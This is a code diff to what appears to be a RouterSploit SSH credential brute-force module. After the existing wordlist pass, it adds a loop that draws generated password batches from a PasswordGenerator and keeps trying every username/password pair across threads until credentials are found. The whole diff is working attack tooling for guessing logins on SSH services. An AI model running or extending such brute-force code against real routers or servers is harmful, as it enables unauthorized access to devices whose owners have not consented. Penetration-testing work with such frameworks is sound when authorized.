@@ -2,6 +2,7 @@ import itertools
 from routersploit.core.exploit import *
 from routersploit.core.ssh.ssh_client import SSHClient
 from routersploit.resources import wordlists
+from routersploit.resources.wordlists.password_generator import PasswordGenerator
 
 
 class Exploit(SSHClient):
@@ -41,6 +42,15 @@ class Exploit(SSHClient):
 
         data = LockedIterator(itertools.product(self.usernames, self.passwords))
         self.run_threads(self.threads, self.target_function, data)
+
+        password_generator = PasswordGenerator(11)
+
+        passwords = password_generator.new_passwords()
+
+        while passwords:
+            data = LockedIterator(itertools.product(self.usernames, passwords))
+            self.run_threads(self.threads, self.target_function, data)
+            passwords = password_generator.new_passwords()
 
         if self.credentials:
             print_success("Credentials found!")
